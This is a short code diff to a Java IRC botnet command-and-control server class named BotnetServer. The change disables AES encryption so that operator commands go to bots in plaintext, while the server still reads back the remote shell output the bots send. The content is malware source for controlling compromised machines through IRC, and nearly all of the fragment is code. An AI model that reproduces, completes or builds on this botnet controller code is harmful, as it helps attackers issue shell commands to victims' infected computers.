@@ -99,10 +99,10 @@ public class BotnetServer extends PircBot {
 			input = new Scanner(System.in);
 			
 			botInfo = new HashMap<String, Key>();
-			masterKey = new SecretKeySpec(key, "AES");
-			masterCipher = Cipher.getInstance("AES");
-			masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
-			masterMsgE = MsgEncrypt.getInstance(masterKey);
+			//masterKey = new SecretKeySpec(key, "AES");
+			//masterCipher = Cipher.getInstance("AES");
+			//masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
+			//masterMsgE = MsgEncrypt.getInstance(masterKey);
 		} catch (NickAlreadyInUseException e) {
 			changeNick(NAME);
 		} catch (Exception e) {
@@ -346,7 +346,9 @@ public class BotnetServer extends PircBot {
 				
 				String command = input.nextLine();
 				while (!command.equalsIgnoreCase(TERMINATION)) {
-					chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
+					// TODO: make this encrypted
+					//chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
+					chat.sendLine(command);
 					String response = shellout.nextLine();
 					while (!response.endsWith(SENTINEL)) {
 						System.out.println("\t" + response);
